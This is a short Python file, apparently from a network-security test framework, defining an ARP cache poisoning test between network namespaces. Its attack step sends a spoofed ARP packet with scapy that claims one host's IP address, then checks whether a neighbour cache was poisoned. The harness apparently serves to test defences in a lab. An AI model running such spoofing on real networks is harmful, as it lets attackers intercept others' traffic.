from lib.connectivity import *
from attacks.attack import Attack
from pyroute2 import IPRoute
import netns
import scapy.all as scapy

class ArpCachePoison(Attack):

    def setup(self) -> None:
        ans = arping(self.interfaces, 0, self.interfaces[1].ip)
        assert len(ans.res) == 1
        ans = arping(self.interfaces, 2, self.interfaces[1].ip)
        assert len(ans.res) == 1

        with netns.NetNS(nsname='host1'):
            ipr = IPRoute()
            cache0 = ipr.get_neighbours(dst=self.interfaces[0].ip, lladdr=self.interfaces[0].mac)
            assert len(cache0) > 0

    def attack(self) -> None:
        with netns.NetNS(nsname='host2'):
            scapy.sendp( scapy.Ether(dst=self.interfaces[1].mac)/scapy.ARP(op='who-has', psrc=self.interfaces[0].ip, pdst=self.interfaces[1].ip))

    def result(self) -> bool:
        with netns.NetNS(nsname='host1'):
            ipr = IPRoute()
            cache0 = ipr.get_neighbours(dst=self.interfaces[0].ip, lladdr=self.interfaces[2].mac)

        if len(cache0) > 0:
            return True
        else:
            return False

    def run(self) -> bool:
        self.setup()
        self.attack()
        res = self.result()

        return res
